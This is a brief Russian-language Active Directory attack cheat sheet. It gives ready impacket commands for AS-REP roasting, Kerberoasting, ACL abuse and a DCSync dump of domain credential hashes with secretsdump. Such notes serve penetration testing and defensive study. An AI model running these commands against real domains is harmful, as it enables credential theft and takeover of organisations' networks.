# 🏢 Active Directory Exploitation

## Kerberos Attacks

### AS-REP Roasting
* **Описание:** Если у пользователя отключена предварительная аутентификация Kerberos, можно запросить хэш и взломать его оффлайн.
* **Команда:** `impacket-GetNPUsers domain.local/ -usersfile users.txt -request -format john`

### Kerberoasting
* **Описание:** Любой пользователь может запросить билет сервиса (TGS) и попытаться его взломать.
* **Команда:** `impacket-GetUserSPNs domain.local/username:password -request`

## ACL Abuse
* **Поиск:** `bloodhound-python` показывает, где есть права GenericWrite, GenericAll, WriteDACL.
* **Эксплуатация:** `impacket-dacledit` для изменения прав.

## DCSync
* **Требование:** Права на репликацию (Replicating Directory Changes).
* **Команда:** `impacket-secretsdump domain/user:pass@dc.domain.local -just-dc`
